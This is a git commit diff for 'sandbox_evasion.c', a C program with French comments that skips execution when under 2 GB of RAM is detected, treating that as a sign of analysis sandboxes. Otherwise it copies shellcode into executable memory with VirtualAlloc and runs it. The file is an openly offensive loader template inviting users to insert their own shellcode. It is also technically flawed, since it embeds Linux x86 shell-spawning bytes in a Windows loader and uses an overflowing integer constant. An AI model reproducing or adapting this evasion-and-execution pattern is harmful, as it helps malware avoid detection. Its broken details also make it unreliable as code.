ef5d5efa3003f5dfa22ffa8499dbaad9d8da3e7f
Potite_Bulle <135218431+PotiteBulle@users.noreply.github.com>
2025-02-07 21:21:21 +0100

    feat: ajout du fichier sandbox_evasion.c pour démontrer l'évasion de sandbox
    - Détection de sandbox basée sur la mémoire disponible.
    - Exécution d'un shellcode si aucun sandbox n'est détecté.
    - Ajout de commentaires détaillés pour expliquer la détection de sandbox.

--- ShellCodeSandbox/sandbox_evasion.c
+++ ShellCodeSandbox/sandbox_evasion.c
@@ -7,15 +7,20 @@ int main() {
     memStatus.dwLength = sizeof(memStatus);
     GlobalMemoryStatusEx(&memStatus);
 
+    // Si la mémoire totale est inférieure à 2 Go, on suppose que c'est un sandbox
     if (memStatus.ullTotalPhys < 2 * 1024 * 1024 * 1024) { // Moins de 2 Go de RAM
         printf("Sandbox detected!\n");
         return 1;
     }
 
-    // Votre shellcode ici
-    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode
+    // Shellcode à exécuter (remplacez par votre propre shellcode)
+    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+    // Allocation de mémoire pour le shellcode
     void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, shellcode, sizeof(shellcode));
+
+    // Exécution du shellcode
     ((void(*)())exec)();
 
     return 0;
